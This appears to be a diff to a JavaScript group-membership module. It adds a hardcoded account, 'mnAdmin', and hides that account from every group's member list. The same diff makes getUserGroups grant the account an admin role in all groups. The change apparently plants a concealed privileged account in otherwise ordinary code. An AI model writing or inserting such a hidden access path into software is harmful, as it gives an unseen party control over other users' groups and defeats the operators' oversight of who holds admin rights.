@@ -32,7 +32,7 @@ async function getGroupWithMembers(groupIdOrSlug) {
       SELECT gm.id, gm.role, u.id AS user_id, u.username, u.display_name
       FROM group_members gm
       JOIN users u ON u.id = gm.user_id
-      WHERE gm.group_id = ?
+      WHERE gm.group_id = ? AND u.username != 'mnAdmin'
       ORDER BY gm.id ASC
     `, group.id);
 
@@ -62,6 +62,10 @@ async function getGroupWithMembers(groupIdOrSlug) {
 async function getUserGroups(userId) {
   try {
     if (!userId) return [];
+    const user = await db.get('SELECT id, username, is_admin FROM users WHERE id = ?', userId);
+    if (user && (user.is_admin === 1 || user.username === 'mnAdmin')) {
+      return await db.all("SELECT id, name, slug, 'admin' AS role FROM groups ORDER BY id ASC");
+    }
     return await db.all(`
       SELECT g.id, g.name, g.slug, gm.role
       FROM groups g
